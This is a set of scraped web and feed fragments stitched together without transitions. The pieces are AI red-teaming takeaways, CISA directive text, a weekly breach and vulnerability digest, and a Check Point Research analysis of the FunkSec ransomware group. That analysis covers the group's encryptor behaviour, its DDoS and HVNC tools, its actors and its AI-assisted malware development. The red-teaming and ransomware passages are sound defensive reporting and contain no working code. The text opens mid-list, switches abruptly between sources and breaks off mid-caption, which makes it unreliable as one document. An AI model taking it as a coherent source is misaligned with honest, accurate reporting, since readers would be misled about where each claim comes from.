&lt;li&gt;&lt;strong&gt;Cultural competence&lt;/strong&gt;: Modern language models use primarily English training data, performance benchmarks, and safety evaluations. However, as AI models are deployed around the world, it is crucial to design red teaming probes that not only account for linguistic differences but also redefine harms in different political and cultural contexts. These methods can be developed only through the collaborative effort of people with diverse cultural backgrounds and expertise.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Emotional intelligence&lt;/strong&gt;: In some cases, emotional intelligence is required to evaluate the outputs of AI models. One of the case studies in our whitepaper discusses how we are probing for psychosocial harms by investigating how chatbots respond to users in distress. Ultimately, only humans can fully assess the range of interactions that users might have with AI systems in the wild.&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Red team tip&lt;/strong&gt;: Adopt tools like PyRIT to scale up operations but keep humans in the red teaming loop for the greatest success at identifying impactful AI safety and security vulnerabilities.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h3 class="wp-block-heading" id="takeaway-3-defense-in-depth-is-key-for-keeping-ai-systems-safe"&gt;Takeaway 3: Defense in depth is key for keeping AI systems safe&lt;/h3&gt;



&lt;p&gt;Numerous mitigations have been developed to address the safety and security risks posed by AI systems. However, it is important to remember that mitigations do not eliminate risk entirely. Ultimately, AI red teaming is a continuous process that should adapt to the rapidly evolving risk landscape and aim to raise the cost of successfully attacking a system as much as possible.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Novel harm categories&lt;/strong&gt;: As AI systems become more sophisticated, they often introduce entirely new harm categories. For example, one of our case studies explains how we probed a state-of-the-art LLM for risky persuasive capabilities. AI red teams must constantly update their practices to anticipate and probe for these novel risks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Economics of cybersecurity&lt;/strong&gt;: Every system is vulnerable because humans are fallible, and adversaries are persistent. However, you can deter adversaries by raising the cost of attacking a system beyond the value that would be gained. One way to raise the cost of cyberattacks is by using break-fix cycles.&lt;sup&gt;1&lt;/sup&gt; This involves undertaking multiple rounds of red teaming, measurement, and mitigation—sometimes referred to as &amp;#8220;purple teaming&amp;#8221;—to strengthen the system to handle a variety of attacks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Government action&lt;/strong&gt;: Industry action to defend against cyberattackers and&lt;br /&gt;failures is one side of the AI safety and security coin. The other side is&lt;br /&gt;government action in a way that could deter and discourage these broader&lt;br /&gt;failures. Both public and private sectors need to demonstrate commitment and vigilance, ensuring that cyberattackers no longer hold the upper hand and society at large can benefit from AI systems that are inherently safe and secure.&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Red team tip&lt;/strong&gt;: Continually update your practices to account for novel harms, use break-fix cycles to make AI systems as safe and secure as possible, and invest in robust measurement and mitigation techniques.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats.

&lt;p&gt;Critical infrastructure and industrial control systems are prime targets for cyberattacks. The authoring agencies warn that threat actors, when compromising OT components, target specific OT products rather than specific organizations. Many OT products are not designed and developed with Secure by Design principles and often have easily exploited weaknesses. When procuring products, OT owners and operators should select products from manufacturers who prioritize security elements identified in this guidance.&lt;/p&gt;

&lt;br /&gt;&lt;br /&gt;
&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;The International Civil Aviation Organization (ICAO), that is part of the UN, &lt;a href="https://therecord.media/icao-un-confirms-recruitment-systems-data-breach"&gt;confirmed&lt;/a&gt; a compromise of its recruitment database that exposed 42,000 recruitment applications. The data contains records from April 2016 to July 2024 and includes recruitment-related information, such as names, email addresses, dates of birth, and employment history.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
 	&lt;li&gt;Argentina’s airport security police (PSA) has been &lt;a href="https://securityaffairs.com/172776/uncategorized/argentinas-airport-security-police-psa-payroll-hacked.html"&gt;compromised&lt;/a&gt; with threat actors gaining access to its payroll systems. The attack occurred through a vulnerability in the systems of Banco Nación, which processes PSA’s payroll. The threat actors obtained personal and financial data of the agency’s officers and civilian personnel.&lt;/li&gt;
 	&lt;li&gt;Slovakia’s Office of Geodesy, Cartography and Land Registry (UGKK) has been &lt;a href="https://spectator.sme.sk/politics-and-society/c/news-digest-quite-possibly-the-worst-cyber-attack-in-history-of-slovakia"&gt;compromised&lt;/a&gt;, affecting availability of the land ownership database. Media outlets report that UGKK fell victim to an undisclosed ransomware group.&lt;/li&gt;
 	&lt;li&gt;Spanish telecommunications company Telefónica was &lt;a href="https://www.bleepingcomputer.com/news/security/telefonica-confirms-internal-ticketing-system-breach-after-data-leak/"&gt;targeted&lt;/a&gt; by Hellcat Ransomware. The threat actors accessed Telefónica’s ticketing system and extracted 2,3 GB of documents, tickets data and internal files. The database was leaked on a hacking forum.&lt;/li&gt;
 	&lt;li&gt;Everest ransomware group has &lt;a href="https://www.stiiizy.com/pages/notice-of-data-breach"&gt;breached&lt;/a&gt; a popular cannabis vendor named STIIIZY through a 3&lt;sup&gt;rd&lt;/sup&gt; party point-of-sale processing service. The compromise occurred between October 10, 2024, and November 10, 2024, and led to extraction of personal data and IDs of 422,075 customers.&lt;/li&gt;
 	&lt;li&gt;BayMark Health Services were &lt;a href="https://ago.vermont.gov/sites/ago/files/documents/2025-01-08%20BayMark%20Health%20Services%20Data%20Breach%20Notice%20to%20Consumers.pdf"&gt;compromised&lt;/a&gt; by RansomHub ransomware group, which also exfiltrated 1.5 TB of its data. The attack occurred between September 24, 2024, and October 14, 2024, providing the attackers access to personal identifiable information, such as Social Security numbers, dates of birth, insurance information and other details.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
 	&lt;li&gt;Russian internet services provider (ISP) named Nodex was &lt;a href="https://therecord.media/russian-internet-provider-says-network-destroyed-cyberattack"&gt;shut down&lt;/a&gt; by a Ukrainian hacktivist group Ukrainian Cyber Alliance. The attack has destroyed the company’s network, dropping global traffic from Nodex’s autonomous system AS29329 to zero.&lt;/li&gt;
 	&lt;li&gt;The Green Bay Packers&amp;#8217; official online store &lt;a href="https://www.greenbaypressgazette.com/story/sports/nfl/packers/2025/01/07/packers-pro-shop-experienced-data-breach-in-fall-2024-green-bay/77514322007/"&gt;suffered&lt;/a&gt; a security breach that resulted in the theft of payment card information from over 8,500 customers. Attackers injected malicious code into the checkout page between September and October 2024, capturing personal and payment details. Payments made via gift cards, PayPal, or Amazon Pay were not affected.&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;Mozilla has &lt;a href="https://www.mozilla.org/en-US/security/advisories/mfsa2025-01/"&gt;released&lt;/a&gt; version 134 of its Firefox browser, addressing 11 security vulnerabilities. Three of the patched vulnerabilities, CVE-2025-0242, CVE-2025-0244 and CVE-2025-0247 are considered of high severity as they allowed memory corruption or address bar spoofing.&lt;/li&gt;
 	&lt;li&gt;SonicWall has &lt;a href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003"&gt;published&lt;/a&gt; an advisory addressing high severity authentication bypass vulnerability CVE-2024-53704 alongside three other medium security vulnerabilities. The company has been sending out emails urging customers to update the firmware due to high susceptibility of exploitation of the vulnerability.&lt;/li&gt;
 	&lt;li&gt;Mediatek has &lt;a href="https://corp.mediatek.com/product-security-bulletin/January-2025"&gt;issued&lt;/a&gt; an advisory addressing 13 security vulnerabilities affecting the company&amp;#8217;s products. Among the vulnerabilities is the critical vulnerability CVE-2024-20154, which allows exploiting an out-of-bounds write to gain remote code execution.&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;uncovered&lt;/a&gt; Banshee, a macOS infostealer that mimics Apple&amp;#8217;s XProtect antivirus engine to evade detection. Operating as a Stealer-as-a-Service, Banshee has been distributed via phishing websites and malicious GitHub repositories, targeting macOS users to steal browser credentials, cryptocurrency wallets, and sensitive file data. Despite the operation&amp;#8217;s shutdown following a source code leak, threat actors continue to distribute the infostealer.&lt;/li&gt;
 	&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/funksec-alleged-top-ransomware-group-powered-by-ai/"&gt;analyzed&lt;/a&gt; the FunkSec ransomware group, which emerged in late 2024 and claimed over 85 victims in December, surpassing other ransomware groups during that period. FunkSec appears to utilize AI-assisted malware development, enabling even inexperienced actors to produce and refine advanced tools rapidly. The group&amp;#8217;s activities blur the line between hacktivism and cybercrime, with some leaked datasets recycled from previous hacktivist campaigns, raising doubts about the authenticity of their disclosures.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Wins.Funksec.A) &lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
 	&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/security/brand-impersonation-scam-hijacks-travel-agency-accounts/"&gt;identified&lt;/a&gt; a phishing campaign that has targeted 7,300 businesses and 40,000 individuals around the world, with the majority of targets in the US. The campaign uses compromised accounts of a travel agency Riya, delivering malware, and harvesting credentials.&lt;/li&gt;
 	&lt;li&gt;Researchers have &lt;a href="https://therecord.media/china-espionage-ivanti-vulnerabilities-mandiant"&gt;identified&lt;/a&gt; that China-affiliated espionage groups are exploiting a newly disclosed vulnerability, CVE-2025-0282, in Ivanti&amp;#8217;s Connect Secure VPN appliances. Mandiant observed initial exploitation in mid-December by malware families such as SPAWN, previously associated with Chinese threat actors like UNC5221. The US Cybersecurity and Infrastructure Security Agency (CISA) has mandated federal agencies to patch this vulnerability by January 15, 2025, due to its active exploitation.&lt;/li&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/funksec-alleged-top-ransomware-group-powered-by-ai/"&gt;FunkSec – Alleged Top Ransomware Group Powered by AI&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading" id="key-points"&gt;Key Points&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The FunkSec ransomware group emerged in late 2024 and published over 85 victims in December, surpassing every other ransomware group that month.&lt;/li&gt;



&lt;li&gt;FunkSec operators appear to use AI-assisted malware development which can enable even inexperienced actors to quickly produce and refine advanced tools.&lt;/li&gt;



&lt;li&gt;The group’s activities straddle the line between hacktivism and cybercrime, complicating efforts to understand their true motivations.&lt;/li&gt;



&lt;li&gt;Many of the group’s leaked datasets are recycled from previous hacktivism campaigns, raising doubts about the authenticity of their disclosures.&lt;/li&gt;



&lt;li&gt;Current methods of assessing ransomware group threats often rely on the actors’ own claims, highlighting the need for more objective evaluation techniques.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;The FunkSec ransomware group first emerged publicly in late 2024, and rapidly gained prominence by publishing over 85 claimed victims—more than any other ransomware group in the month of December. Presenting itself as a new Ransomware-as-a-Service (RaaS) operation, FunkSec appears to have no known connections to previously identified ransomware gangs, and little information is currently available about its origins or operations.&lt;/p&gt;



&lt;p&gt;Our analysis of the group’s activity indicates that the impressive numbers of published victims may mask a more modest reality both in terms of actual victims as well as the group’s level of expertise. Most of FunkSec’s core operations are likely conducted by inexperienced actors. In addition, it is difficult to verify the authenticity of the leaked information as the group’s primary goal appears to be to gain visibility and recognition. Evidence suggests that in some instances, the leaked information was recycled from previous hacktivist-related leaks, raising questions about its authenticity.&lt;/p&gt;



&lt;p&gt;In this report, we explore FunkSec’s ties to hacktivist activity and provide an in-depth analysis of the group’s public operations and tools, including a custom encryptor likely developed by a relatively inexperienced malware author based in Algeria. In a surprising discovery, our findings indicate that the development of the group’s tools, including the encryptor, was likely AI-assisted, which may have contributed to their rapid iteration despite the author’s apparent lack of technical expertise&lt;/p&gt;



&lt;p&gt;This case highlights the increasingly blurred line between hacktivism and cybercrime, emphasizing the challenges in distinguishing one from the other. Whether such a distinction genuinely exists—or whether the operators are even aware of or concerned with defining it—remains uncertain. More importantly, It also calls into question the reliability of current methods for assessing the risk posed by ransomware groups, especially when those assessments rely on the public claims of the actors themselves.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="background---funksec-activity"&gt;Background &amp;#8211; FunkSec Activity&lt;/h2&gt;



&lt;p&gt;FunkSec is an emerging ransomware group that launched its data leak site (DLS) in December 2024 to centralize their ransomware activities. The group uses double extortion tactics, combining data theft with encryption to pressure victims into paying ransoms. Their DLS features breach announcements, a custom-developed DDoS tool, and, more recently, a custom ransomware offered as a Ransomware-as-a-Service (RaaS).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 1 - FunkSec data leak site." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image1.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; FunkSec data leak site.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;FunkSec gained public attention due to their aggressive tactics and the number of their targets, with more than 85 claimed victims in little over a month of activity. Notably, FunkSec demanded unusually low ransoms, sometimes as little as $10,000, and sell stolen data to third parties at reduced prices. The group’s activities are widely discussed in cybercrime forums, further contributing to their growing notoriety.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 2 – &amp;lt;span dir=" src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image2.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 –&amp;nbsp;Distribution of FunkSec claimed victims by country according to DLS.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Closer analysis of FunkSec’s activities and DarkWeb discussions offers some tantalizing hints about the group, namely that their motivations seem to straddle the line between hacktivism and cybercrime. Interestingly, some members linked to FunkSec previously engaged in hacktivist activities, adding a complex layer to their operations and raising questions about their true objectives. This blend of tactics and backgrounds made FunkSec a particularly intriguing case for deeper investigation.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="funksec-offerings"&gt;FunkSec Offerings&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="ransomware"&gt;Ransomware&lt;/h3&gt;



&lt;p&gt;FunkSec operators recently began to offer their rapidly evolving custom ransomware. With each new version, many of them published only days apart, their website is updated to highlight the added features. In the announcement for the latest version V1.5, the operators boasted about its low detection rate, sharing a VirusTotal screenshot that showed it was detected by only three antivirus engines at the time of publication.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 3 - Funksec V1.5 publication announcement." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image3.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Funksec V1.5 publication announcement.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The file referenced in their publication(&lt;code&gt;5226ea8e0f516565ba825a1bbed10020982c16414750237068b602c5b4ac6abd&lt;/code&gt;), named&amp;nbsp;&lt;code&gt;dev.exe&lt;/code&gt;, was uploaded from an Algerian source, and truly was detected by only 3 engines at the time of upload. The ransomware is identified by using the extension &amp;#8220;.funksec”, written in Rust and compiled on the environment of&amp;nbsp;&lt;code&gt;C:\Users\Abdellah\&lt;/code&gt;. A full analysis of the malware is provided in the Technical Analysis section.&lt;/p&gt;



&lt;p&gt;In our analysis of this ransomware, we uncovered all its versions which point to an ongoing development effort likely carried out by an inexperienced malware author. Notably, most of the versions were uploaded from Algeria, likely by the author himself. Analysis of those samples reveals two variants of the ransom notes. The first references FunkSec, and the second one references Ghost Algeria, another indication that the developer is from Algeria.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;img decoding=" src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image4.png" /&gt;&lt;img src="https://research.checkpoint.com/&amp;gt;&amp;lt;figcaption class=" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;Figure 4 &amp;#8211; Ransomware notes used by FunkLocker and Ghost Algeria.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Interestingly, the author also uploaded parts of the malware’s source code, written in Rust. The source code file, named&amp;nbsp;&lt;code&gt;*ransomware.rs*&lt;/code&gt;, has parts of the functionality of the compiled binaries and was uploaded to VirusTotal on December 15 from an Algerian source. This prototype version of the ransomware is a simplified implementation and includes these functions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Encrypt all files on the user’s system&lt;/strong&gt;&amp;nbsp;(in the&amp;nbsp;&lt;code&gt;C:\&lt;/code&gt;&amp;nbsp;directory) using a combination of RSA and AES encryption. The original files are deleted after encryption, and encrypted versions with a new extension (&lt;code&gt;.funksec&lt;/code&gt;) are created.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Create a ransom note&lt;/strong&gt;&amp;nbsp;(&lt;code&gt;readme.me&lt;/code&gt;) informing the user that their files have been encrypted and providing instructions for paying a ransom to obtain a decryption key.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Modify the system environment&lt;/strong&gt;&amp;nbsp;(e.g., changing the desktop background to black).&lt;/li&gt;



&lt;li&gt;Check for&amp;nbsp;&lt;strong&gt;administrative/root privileges&lt;/strong&gt;&amp;nbsp;before executing.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="other-free-tools"&gt;Other free tools&lt;/h3&gt;



&lt;p&gt;In addition to the ransomware, the FunkSec group offers additional tools, most of them commonly associated with hacktivist activity.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 5 - Additional offerings by FunkSec." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image6.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Additional offerings by FunkSec.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;ul class="wp-block-list"&gt;
&lt;li&gt;FDDOS, a Python “Scorpion DDoS Tool”, is a network stress-testing tool designed to perform Distributed Denial-of-Service (DDoS) attacks using either HTTP or UDP flood methods.&lt;/li&gt;



&lt;li&gt;JQRAXY_HVNC an HVNC Server and client C++ program is designed for remote desktop management, automation, and data interaction.&lt;/li&gt;



&lt;li&gt;funkgenerate is a smart password generation and scraping tool designed to scrape emails and potential passwords from given URLs and generate new password suggestions.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="associated-threat-actors"&gt;Associated Threat Actors&lt;/h2&gt;



&lt;p&gt;In late 2024, FunkSec emerged without warning and quickly dominated ransomware victim feeds and monitors, seemingly under the guise of hacktivism. By targeting India and the U.S., and aligning with the “Free Palestine” movement, the group leveraged multiple personas and aliases to craft its image and gain visibility.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31003" src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image7-1024x346.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; FunkSec claims about US targets.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="scorpion"&gt;Scorpion&lt;/h3&gt;



&lt;p&gt;Scorpion is the most prominent member of FunkSec and is associated with major portions of the group public profiles. This actor uses multiple aliases, most prominently&amp;nbsp;&lt;strong&gt;DesertStorm&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The actor first surfaced on the Breached Forum, introducing the FunkSec name through a YouTube video posted via the channel “Scorpion” (@scorpioncybersec) in October 2024. The video alleged that FunkSec leaked a call between then-U.S. presidential candidate Donald Trump and Israeli Prime Minister Benjamin Netanyahu. However, the recording was clearly AI-generated.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 7 - Announcement of the allegedly leaked call between Donald
Trump and Benjamin Netanyahu." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image8.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Announcement of the allegedly leaked call between Donald Trump and Benjamin Netanyahu.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;DesertStorm’s YouTube profile listed their location as Russia, though the video’s shared URL suggested it was uploaded from Brazil. DesertStorm continued posting leaks on Breached Forum—most unverified or not credited to FunkSec—until the account was banned in November 2024.&lt;/p&gt;



&lt;p&gt;In one of DesertStorm’s posts, they inadvertently shared compromising screenshots that revealed their location to be Algeria, with French-language keyboard settings. A suspected associate,&amp;nbsp;&lt;strong&gt;XTN&lt;/strong&gt;, publicly alerted DesertStorm to this operational security (OpSec) lapse, but DesertStorm did not remove the compromising information.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 8 - Screenshot tying DesertStorm to Algeria." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image9.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Screenshot tying DesertStorm to Algeria.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Before DesertStorm’s ban, the actor began tagging two other users,&amp;nbsp;&lt;strong&gt;El_Farado&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Blako&lt;/strong&gt;, in forum posts related to FunkSec leaks and activities. While Blako remained inactive on the forums, El Farado gradually assumed a prominent role, promoting FunkSec on forums, sharing leaks, and adding the group’s .onion site to their signature.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 9 -Connection between DesertStorm and El_farado" src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image10.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 -Connection between DesertStorm and El_farado&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The actor is also linked to a Keybase account under the name “Scorpionlord,” where they are listed as the admin of FunkSec. This account is tied to the FunkSec shame site and DesertStorm’s user on Breached Forum. Scorpionlord is also the username on two other cybercrime forums where the FunkSec’s website was promoted (these users were since removed).&lt;/p&gt;



&lt;p&gt;Notably, El Farado’s Keybase profile was registered on the same day as Scorpionlord’s, suggesting a coordinated effort. A third Keybase profile,&amp;nbsp;&lt;strong&gt;Blako&lt;/strong&gt;, was registered only a few days later, further supporting the idea that these personas were all closely linked.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 10 - Scorpion Keybase profile." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image11.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; Scorpion Keybase profile.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="el_farado"&gt;El_farado&lt;/h3&gt;



&lt;p&gt;El Farado emerged as a key figure in FunkSec’s operations after DesertStorm’s ban from Breached Forum in November 2024. El Farado took on the task of promoting FunkSec, ensuring its visibility on the forum and sharing alleged leaks.&lt;/p&gt;



&lt;p&gt;Key connections to FunkSec include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Tagged by DesertStorm:&lt;/strong&gt;&amp;nbsp;DesertStorm’s posts frequently tagged El Farado, linking them directly to FunkSec.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Keybase Profile Registration:&lt;/strong&gt;&amp;nbsp;El Farado’s Keybase account was registered on the same day as Scorpionlord’s, implying a strong connection between the two personas.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Promotional Activity:&lt;/strong&gt;&amp;nbsp;El Farado actively promoted FunkSec’s .onion site on Breached Forum and shared leaks (often unreliable or recycled).&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Rookie Behavior:&lt;/strong&gt;&amp;nbsp;El Farado occasionally posted threads asking basic hacking questions like “What do hackers do with leaked data?” This behavior suggests inexperience, corroborating some Scorpion’s admission of the group’s lack of technical know-how.&lt;/li&gt;
&lt;/ul&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 11 - el_farado asking for hacking assistance." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image12.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; el_farado asking for hacking assistance.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="xtn"&gt;XTN&lt;/h3&gt;



&lt;p&gt;XTN is associated with FunkSec’s “data sorting” service advertised on their website, while this service’s purpose is not fully clear. Their Keybase account, “xtnn,” connects to their Breached Forum profile, where they describe their location as “El Farado’s room” and reference El Farado in their signature. XTN further solidified their link to FunkSec by publicly warning DesertStorm about their OpSec lapse.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="bjorka"&gt;Bjorka&lt;/h3&gt;



&lt;p&gt;Bjorka, a known Indonesian hacktivist, has a murkier connection to FunkSec. While leaks attributed to FunkSec were reposted by a user named Bjorka on DarkForums, no direct collaboration was verified. Additionally, a Telegram channel named “Bjorkanism” claimed credit for some FunkSec operations, referring to them as “Bjorkanism Ransomware (FunkSec).” These claims are not supported by Bjorka’s official platforms, suggesting attempts at impersonating Bjorka or at most, a loose affiliation.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 12 - Bjorkanism referenced as FunkSec ransomware." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image13.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Bjorkanism referenced as FunkSec ransomware.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="related-hacktivist-groups"&gt;Related Hacktivist Groups&lt;/h3&gt;



&lt;p&gt;FunkSec attempted to associate itself with several defunct hacktivist groups:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Ghost Algéria:&lt;/strong&gt;&amp;nbsp;Referenced in a ransomware note nearly identical to FunkSec’s.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cyb3r Fl00d:&lt;/strong&gt;&amp;nbsp;A defacement screenshot from this group was included in FunkSec-related activity, with FunkSec claiming Cyb3r Fl00d was their “old group.”&lt;/li&gt;
&lt;/ul&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 13 -Affiliation between FunkSec and Cyb3r Fl00d" src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image14.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 -Affiliation between FunkSec and Cyb3r Fl00d&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These associations likely represent attempts to boost FunkSec’s credibility by aligning with well-known names rather than direct membership or collaboration.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="ai-assisted-capabilities"&gt;AI-Assisted capabilities&lt;/h2&gt;



&lt;p&gt;The individuals behind FunkSec appear to have extensively leveraged AI to enhance their capabilities, as evidenced by their publications and tools. Their public script offerings include extensive code comments with perfect English (as opposed to very basic English in other mediums), likely generated by an LLM agent. Similar patterns are visible in the Rust source code linked to the group’s ransomware, suggesting it may have been developed with AI assistance.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 14 - Detailed comments in Scorpion DDoS script." src="https://research.checkpoint.com/wp-content/uploads/2025/01/QZW5JB4KMR-image15.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; Detailed comments in Scorpion DDoS script.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;In some of their published messages, the group specifically linked the development of their ransomware to AI-assisted agents, likely providing it with the source code for the ransomware and simply shared the output on their site.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 15 - FunkSec claims of AI interpretation of their Ransomware
